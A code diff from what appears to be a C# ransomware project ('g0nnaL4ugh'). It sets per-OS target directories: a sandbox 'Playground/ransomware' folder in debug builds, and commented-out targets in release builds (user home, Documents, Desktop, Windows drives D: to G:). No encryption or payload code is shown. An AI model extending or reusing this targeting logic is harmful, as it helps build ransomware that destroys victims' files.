@@ -20,21 +20,49 @@ namespace g0nnaL4ugh
             {
                 case OperatingSystem.OSX:
                     home = Path.Combine("/Users", user);
+#if DEBUG
+                    start = new List<string>() {
+                        Path.Combine(home, "Playground/ransomware")
+                    };
+#else
+                    start = new List<string>() {
+                        // home,
+                        // Path.Combine(home, "Documents"),
+                        // Path.Combine(home, "Desktop")
+                    };
+#endif
                     break;
                 case OperatingSystem.Unix:
                     home = Path.Combine("/home", user);
 #if DEBUG
                     start = new List<string>() {
-                    Path.Combine(home, "Playground/ransomware")
-                };
+                        Path.Combine(home, "Playground/ransomware")
+                    };
 #else
                     start = new List<string>() {
-                    // home
+                        // home,
+                        // Path.Combine(home, "Documents"),
+                        // Path.Combine(home, "Desktop")
                     };
 #endif
                     break;
                 case OperatingSystem.Win:
                     home = Path.Combine(@"C:\Users", user);
+#if DEBUG
+                    start = new List<string>() {
+                        Path.Combine(home, @"Playground\ransomware")
+                    };
+#else
+                    start = new List<string>() {
+                        // home,
+                        // Path.Combine(home, "Documents"),
+                        // Path.Combine(home, "Desktop"),
+                        // @"D:",
+                        // @"E:",
+                        // @"F:",
+                        // @"G:",
+                    };
+#endif
                     break;
             }
             // Common values
